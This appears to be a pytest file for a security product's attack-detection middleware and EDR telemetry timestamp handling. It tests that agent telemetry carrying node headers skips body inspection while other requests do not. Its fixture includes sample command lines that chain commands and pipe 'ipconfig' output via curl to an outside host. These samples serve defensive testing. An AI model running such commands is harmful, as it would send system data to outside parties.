"""Aware agent timestamps + telemetry bodies must not trip attack detection."""
from datetime import datetime, timezone

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from app.core import attack_detector as ad
from app.core.timeutil import parse_agent_ts, to_naive_utc


# --- timestamp normalisation -------------------------------------------------

def test_to_naive_utc_converts_offset():
    aware = datetime.fromisoformat("2026-09-30T00:36:08-04:00")
    assert to_naive_utc(aware) == datetime(2026, 9, 30, 4, 36, 8)
    assert to_naive_utc(aware).tzinfo is None


def test_naive_left_alone():
    n = datetime(2026, 9, 30, 4, 36, 8)
    assert to_naive_utc(n) is n


@pytest.mark.parametrize("raw", [
    "2026-09-30T04:36:08Z",
    "2026-09-30T04:36:08+00:00",
    "2026-09-30T00:36:08-04:00",
    "2026-09-30T04:36:08",
])
def test_parse_agent_ts_always_naive_utc(raw):
    ts = parse_agent_ts(raw)
    assert ts.tzinfo is None
    assert ts == datetime(2026, 9, 30, 4, 36, 8)


def test_parse_agent_ts_fallback():
    assert parse_agent_ts("garbage").tzinfo is None
    assert parse_agent_ts(None).tzinfo is None
    assert parse_agent_ts("").tzinfo is None


def test_edr_event_row_timestamp_is_naive():
    """The ingest path builds AgentEvent(timestamp=parse_agent_ts(ev.at))."""
    ts = parse_agent_ts("2026-09-30T04:36:08.123456+00:00")
    assert ts.tzinfo is None
    assert ts < datetime.now(timezone.utc).replace(tzinfo=None)  # comparable with utcnow()


# --- middleware body inspection ---------------------------------------------

# Real-world telemetry shapes that the body regex flags as command_injection.
BODY = {"events": [
    {"kind": "process_start", "command_line": "powershell.exe -NoProfile -Command Get-Process; whoami"},
    {"kind": "process_start", "command_line": "cmd.exe /c ipconfig | curl.exe -d @- example.com"},
]}
NODE = {"X-AEGIS-Node-Token": "tok", "X-AEGIS-Node-Id": "node-1"}


@pytest.fixture
def client(monkeypatch):
    blocked = []

    async def fake_block(ip, reason):
        blocked.append((ip, reason))

    monkeypatch.setattr(ad, "_block_ip", fake_block)
    monkeypatch.setattr(ad, "_is_safe_ip", lambda ip, user_agent=None: False)
    monkeypatch.setattr(ad, "_blocked_ips", set())
    ad._attack_log.clear()

    app = FastAPI()
    app.add_middleware(ad.AttackDetectorMiddleware)

    async def ok(payload: dict):
        return {"ok": True}

    for path in ("/api/v1/edr/events", "/api/v1/edr/kill-process"):
        app.post(path)(ok)
    c = TestClient(app)
    c.blocked = blocked
    return c


def _detections():
    return ad._stats["total_detections"]


def test_body_fixture_is_actually_detectable():
    assert ad._check_mega(ad._double_decode(str(BODY))) is not None


def test_telemetry_with_node_headers_not_inspected(client):
    before = _detections()
    r = client.post("/api/v1/edr/events", json=BODY, headers=NODE)
    assert r.status_code == 200
    assert not client.blocked
    assert _detections() == before


def test_telemetry_without_node_headers_still_inspected(client):
    before = _detections()
    r = client.post("/api/v1/edr/events", json=BODY)
    assert _detections() > before


def test_non_telemetry_route_with_node_headers_still_inspected(client):
    before = _detections()
    r = client.post("/api/v1/edr/kill-process", json=BODY, headers=NODE)
    assert _detections() > before


def test_skip_helper_allowlist():
    h = {"x-aegis-node-token": "t"}
    assert ad._skip_body_inspection("/api/v1/edr/events", h)
    assert ad._skip_body_inspection("/api/v1/agents/events", h)
    assert ad._skip_body_inspection("/api/v1/nodes/events", h)
    assert not ad._skip_body_inspection("/api/v1/edr/kill-process", h)
    assert not ad._skip_body_inspection("/api/v1/edr/events", {})
